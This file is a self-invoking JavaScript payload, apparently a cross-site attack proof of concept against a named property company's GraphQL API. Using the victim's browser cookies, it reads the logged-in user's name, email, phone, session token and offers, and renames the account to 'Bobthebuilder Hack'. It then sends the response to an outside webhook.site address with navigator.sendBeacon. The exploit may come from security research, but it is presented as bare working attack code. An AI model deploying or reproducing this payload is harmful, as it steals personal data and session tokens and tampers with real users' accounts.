
(function sendGraphQLRequest() {
    fetch("https://graphql.managed.services.opendoor.com/api/graphql", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/json",
            "Apollographql-Client-Name": "reception-fe-redux-tk",
            "Apollographql-Client-Version": "1.0"
        },
        body: JSON.stringify([
            {
                query: `query getHuman{web{userSession{human{full_name customer_uuid email first_name opendoor_internal_access primary_phone token organizations{uuid name}}}}}`,
                variables: {},
                operationName: "getHuman"
            },
            {
                operationName: "OffersSnapshot",
                variables: {},
                query: `query OffersSnapshot{buyer{offersSnapshot{offers{id addressId contractSignatureId createdAt price state source propertyAddress propertyPhoto __typename} __typename} __typename}}`
            },
            {
                operationName: "UpdateCustomerDetails",
                variables: { firstName: "Bobthebuilder", lastName: "Hack" },
                query: `mutation UpdateCustomerDetails($firstName:String!,$lastName:String!){customerService{updateCurrent(input:{firstName:$firstName,lastName:$lastName}){updatedCustomer{uuid firstName lastName __typename} __typename} __typename}}`
            }
        ])
    })
    .then(r => r.text().then(t => {
        alert(`Status: ${r.status}\n\nResponse:\n${t}`);
        if (navigator.sendBeacon) {
            navigator.sendBeacon("https://webhook.site/be294564-fb2f-49d8-b3a8-ef25c7522be1/query", t);
        }
    }))
    .catch(e => {
        console.error("Request Error:", e);
        alert("Request failed:\n" + e);
    });
})();   // <-- the trailing ()  makes it auto-invoke on load
